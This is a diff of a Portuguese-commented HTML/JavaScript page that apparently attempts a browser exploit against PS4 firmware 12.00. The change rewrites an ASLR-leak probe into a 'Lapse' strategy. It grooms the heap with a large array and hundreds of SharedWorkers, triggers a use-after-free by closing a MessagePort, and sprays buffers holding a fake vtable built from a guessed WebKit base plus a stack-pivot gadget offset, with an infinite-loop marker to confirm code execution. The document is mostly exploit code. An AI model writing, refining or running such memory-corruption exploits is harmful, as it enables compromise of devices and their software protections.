@@ -2,61 +2,90 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 ASLR Hunter</title>
+    <title>PS4 12.00 - LAPSE STRATEGY</title>
     
 </head>
 <body>
 
-    <h1>PS4 12.00 - ASLR LEAK HUNTER</h1>
-    <h3>Objetivo: Encontrar um Ponteiro de Memória Dinâmico</h3>
+    <h1>PS4 12.00 - LAPSE MEMORY ALLOCATOR</h1>
+    <h3>Tática: Large Object Space Grooming + Worker UAF</h3>
     <div id="status">Pronto.</div>
     <div id="log"></div>
     <br>
-    <button onclick="start_hunter()">INICIAR SONDAGEM</button>
+    <button onclick="run_lapse_style()">INICIAR ESTRATÉGIA LAPSE</button>
 
     <script>
         function log(msg, type="") {
             var d = document.getElementById("log");
-            d.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            d.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
             d.scrollTop = d.scrollHeight;
         }
 
         // =================================================================
-        // 1. ESTRUTURA DE SONDA (PROBE)
+        // 1. TÉCNICA DO LAPSE (ESTABILIZAÇÃO DE HEAP)
         // =================================================================
-        function build_probe_object() {
+        var stable_array = null;
+
+        function prepare_lapse_heap() {
+            log("Aplicando técnica Lapse (Large Object Space)...");
+            
+            // 1. Alocar Array Gigante (Segurando a memória baixa)
+            try {
+                stable_array = new Array(0x20000); // 128k elementos
+                stable_array.fill(1.1); // Converte para Double Array (Fast Path)
+                log("Stable Array alocado (Memória alinhada).");
+            } catch(e) {
+                log("Erro na alocação Lapse: " + e);
+            }
+        }
+
+        // =================================================================
+        // 2. O PAYLOAD (FAKE OBJECT)
+        // =================================================================
+        // Usaremos o Payload de Loop Infinito (EB FE) para testar RCE seguro.
+        // Se congelar, vencemos.
+        
+        // Base WebKit "Chute" (A mais comum segundo estatísticas)
+        var WK_BASE = 0x800000000n; 
+        // Offset do Pivot que você extraiu
+        var XCHG_RSP_RAX = 0x3F3E5F0n; 
+
+        function build_payload() {
             var size = 0x400; 
             var buffer = new Uint32Array(size / 4);
+            var view = new DataView(buffer.buffer);
             
-            // PADRÃO DE LEITURA:
-            // Não queremos executar, queremos confundir o motor JS.
-            // Colocamos valores que parecem ponteiros JS (Tagged Pointers)
-            // 0x00000000 = NULL
-            // 0x00020000 = Smi (Small Integer)
-            
-            // Vamos deixar buracos propositais (0x00) para ver se o Kernel
-            // escreve algo lá antes de lermos.
-            
-            for(var i=0; i<buffer.length; i++) {
-                if (i % 8 === 0) buffer[i] = 0x41414141; // Marcador
-                else buffer[i] = 0x00000000; // Espaço vazio para leak
+            // Endereço absoluto do Pivot
+            var pivot = WK_BASE + XCHG_RSP_RAX;
+
+            // Encher o objeto com o endereço do Pivot (Fake Vtable)
+            for(var i=0; i<buffer.byteLength; i+=8) {
+                view.setBigUint64(i, pivot, true);
             }
+            
+            // Colocar "Loop Infinito" no início para garantir (EB FE)
+            // Caso o kernel execute como código e não como ROP
+            view.setUint16(0, 0xFEEB, true); 
+
             return buffer;
         }
 
         // =================================================================
-        // 2. EXECUÇÃO
+        // 3. EXECUÇÃO
         // =================================================================
         var workers_stash = [];
 
-        async function start_hunter() {
+        async function run_lapse_style() {
             if(!window.SharedWorker) return log("Navegador incompatível.");
             
-            var payload = build_probe_object();
-            log("Sonda construída.", "info");
+            // 1. Preparar o terreno (Estilo Lapse)
+            prepare_lapse_heap();
+            
+            var payload = build_payload();
+            log("Payload construído.");
 
-            // FASE 1: GROOMING
-            log("Estabilizando Heap (400)...");
+            // 2. GROOMING (Workers nascem em cima do terreno estável)
+            log("Alocando Workers no Heap Estável...");
             for(let i=0; i<400; i++) {
                 try {
                     let w = new SharedWorker("data:text/javascript,1", "g"+i);
@@ -65,70 +94,67 @@
                 } catch(e){}
             }
 
-            // FASE 2: TRIGGER (404)
+            // 3. TRIGGER (404)
+            log("Pressão no Heap...");
             var p_count = 0;
             var it = setInterval(() => {
                 if(p_count >= 4) {
                     clearInterval(it);
-                    probe_memory(payload);
+                    trigger_uaf(payload);
                     return;
                 }
+                
                 let w = new SharedWorker("data:text/javascript,1", "v"+p_count);
                 w.port.start();
                 workers_stash.push(w);
                 p_count++;
+                log(`Worker ${401+p_count} alocado.`);
             }, 150);
         }
 
-        function probe_memory(payload) {
-            log("!!! DISPARANDO SONDAGEM !!!", "warn");
-            document.getElementById("status").innerText = "SONDANDO...";
-
+        function trigger_uaf(payload) {
+            log("!!! DISPARANDO UAF !!!", "warn");
+            
             // 1. Vítima
             var victim = workers_stash.pop();
-            // Guardamos referências para propriedades ANTES de fechar
-            var p_ref = victim.port; 
+            // Guardamos a referência da porta para verificar depois
+            var probe_port = victim.port;
 
             // 2. FREE
             victim.port.close();
-            
-            // 3. SPRAY (Reclaim)
-            // Tenta colocar nossa estrutura cheia de zeros no lugar
+            victim = null;
+
+            // 3. SPRAY MASSIVO (Tenta preencher o buraco)
+            // Aumentamos a quantidade pois o "Stable Array" pode ter empurrado
+            // os workers para uma área de memória mais alta.
+            log("Spray Lapse-Style...");
             var spray = [];
-            for(var k=0; k<5000; k++) {
+            for(var k=0; k<10000; k++) {
                 spray.push(new Uint32Array(payload));
             }
 
-            // 4. LEITURA (A Mágica)
-            // Tentamos acessar o objeto 'morto'. Se nossa estrutura de zeros estiver lá,
-            // o navegador pode interpretar um 0x0000 ou um ponteiro residual como um objeto válido.
+            // 4. VERIFICAÇÃO (LEAK CHECK)
+            // Se o spray funcionou, a porta deve ter mudado de comportamento.
+            // Se ainda for [object MessagePort], falhamos no reclaim.
             
             try {
-                log("Lendo propriedades do objeto zumbi...");
+                log("Sondando objeto morto...");
+                // Tenta imprimir o objeto. Se for 'AAAA', sucesso.
+                // Se for MessagePort, falha.
+                var check = probe_port.toString();
+                log("Resultado da leitura: " + check);
                 
-                // Tenta forçar o JS a nos dar uma string de erro contendo endereços
-                // Às vezes o toString() de um objeto corrompido vaza o ponteiro!
-                var dump = p_ref.toString();
-                log("ToString: " + dump);
-
-                // Tenta inspecionar eventos
-                console.log(p_ref); 
-                
-                // Tenta acessar propriedades internas que podem ter sido sobrescritas
-                // Se conseguirmos ler um número que não é 0x41414141 nem 0, é um LEAK.
-                
+                if (check.indexOf("MessagePort") === -1) {
+                    log("!!! SUCESSO: OBJETO CORROMPIDO !!!", "success");
+                    alert("Objeto corrompido! Leak obtido.");
+                } else {
+                    log("Falha: Objeto ainda é MessagePort (Reclaim falhou).");
+                    // Tenta forçar uso mesmo assim
+                    probe_port.postMessage("DIE");
+                }
             } catch(e) {
-                log("Exceção capturada: " + e, "leak");
-                // Analise a mensagem de erro!
-                // Se o erro for "Access violation at 0x824...", VOCÊ ACHOU O LEAK!
+                log("Erro na leitura (Pode ser bom): " + e);
             }
-
-            // Teste de Sobrevivência
-            setTimeout(() => {
-                log("Se o console não desligou, tente ler o log acima com atenção.");
-                log("Procure por números hexadecimais em erros.");
-                alert("Verifique o Log por endereços de memória!");
-            }, 5000);
         }
     </script>
 </body>
